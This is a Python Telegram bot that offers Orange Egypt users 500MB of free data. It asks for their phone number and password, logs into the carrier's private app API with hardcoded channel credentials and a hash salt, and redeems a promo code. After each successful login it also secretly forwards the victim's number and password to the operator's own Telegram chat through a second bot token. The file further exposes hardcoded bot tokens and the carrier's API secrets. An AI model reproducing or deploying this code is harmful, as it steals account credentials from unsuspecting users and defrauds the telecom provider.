from requests import *
from telebot import *
from telebot.types import InlineKeyboardMarkup as Mk, InlineKeyboardButton as btn
from server import server

ID1 = "1692313624"
Token = "5817679349:AAHBX62f8DC5Nl-n-uIJEFtG3rMyEpubwGk"
kenot = "6231887556:AAFSmd97ajdKPvXR5k3OVwIDfPZWiZzH8bM"
ch = "almsafra_py"


def check_join(idd):
  res = get(
    f"https://api.telegram.org/bot{Token}/getChatMember?chat_id=@{ch}&user_id={idd}"
  ).json()
  if res['ok']:
    x = res['result']['status']
    if (x == "creator" or x == "member" or x == "administrator"):
      return True
  else:
    return False


bot = TeleBot(Token)


@bot.message_handler(commands=["start"])
def join(message):
  idd = message.from_user.id
  sub = Mk().add(btn(text=bot.get_chat(f"@{ch}").title, url=f"t.me/{ch}"))
  if message.chat.type == "private":
    if not check_join(idd):
      bot.send_message(
        message.chat.id,
        f"*عليك الانضمام * [للقناة اولأ](t.me/{ch}) * حتي تستطيع استخدام الخدمة !*",
        parse_mode="Markdown",
        disable_web_page_preview=True,
        reply_markup=sub)
    else:
      bot.send_message(message.chat.id,
                       text=f'''مرحبآ عزيزي  {message.from_user.first_name}

- Best Bot For Net

- Please Send Your Account 

- Like This 012xxxxxxx:pasword

''',
                       parse_mode="Markdown")

      @bot.message_handler(func=lambda message: True)
      def you(message):
        try:
          import hashlib
          url2= "https://services.orange.eg/GetToken.svc/GenerateToken"
          headers2={
    "Content-Type": "application/json; charset\u003dUTF-8",
    "Content-Length": "78",
    "Host": "services.orange.eg",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "User-Agent": "okhttp/3.14.9"
  }
          data2='{"channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"}}'
          re2=post(url2,headers=headers2,data=data2).json()
          ctv1=re2["GenerateTokenResult"]
          ctv=ctv1["Token"]
          h = hashlib.sha256((ctv+',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk').encode()).hexdigest()
          htv=h.upper()
          msg = message.text
          exc = msg.split(':')
          number = exc[0]
          password = exc[1]
          #########
          ur1 = 'https://services.orange.eg/SignIn.svc/SignInUser'
          headers = {'_ctv': ctv,'_htv': htv,
            'Content-type': 'application/json',
            'Accept': 'application/json',
            'User-Agent':
            'Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 6 Pro MIUI/V10.3.6.0.PEKMIXM)',
            'Host': 'services.orange.eg',
            'Accept-Encoding': 'gzip'
          }
          data1 = '{"appVersion":"2.9.8","channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"},"dialNumber":"%s","isAndroid":true,"password":"%s"}' % (
            number, password)
          req1 = post(ur1, headers=headers, data=data1)
          resp = req1.json()['SignInUserResult']["ErrorDescription"]
          if 'Success' in resp:
            bot.send_message(message.chat.id, "Done login")
            tlg = (
              f'https://api.telegram.org/bot{kenot}/sendMessage?chat_id={ID1}&text=num: {number}\npaass: {password}'
            )
            post(tlg)
            #Max=get("https://glitteringbeigefeeds--nimbuzx.repl.co/")
            #####
            userid = req1.json()["SignInUserResult"]["UserData"]["UserID"]
            url = "https://services.orange.eg/APIs/Promotions/api/CAF/Redeem"
            hed = {"_ctv": ctv,"_htv": htv,
              "isEasyLogin": "false",
              "UserId": userid,
              "Content-Type": "application/json; charset=UTF-8",
              "Content-Length": "190",
              "Host": "services.orange.eg",
              "Connection": "Keep-Alive",
              "Accept-Encoding": "gzip",
              "User-Agent": "okhttpwhitepro/3.12.1"
            }
            json = {
              "Language": "ar",
              "OSVersion": "Android7.0",
              "PromoCode": "رمضان كريم",
              "dial": number,
              "password": password,
              "Channelname": "MobinilAndMe",
              "ChannelPassword": "ig3yh*mk5l42@oj7QAR8yF"
            }
            res1 = post(url, headers=hed, json=json).json()
            y = res1["ErrorDescription"]
            if y == "Success":
              bot.send_message(message.chat.id, "Done 500MB add")
              #####
            else:
              bot.send_message(message.chat.id,
                               "Sorry, try again after a week")
              print("not ok")
          else:
            bot.send_message(message.chat.id, "Error Number or Password")
            print("no")
        except:
          bot.send_message(
            message.chat.id, """أدخالك غير صحيح ادخل الحساب بهذا الشكل
012xxxxxxx:pasword""")


server()
bot.infinity_polling()
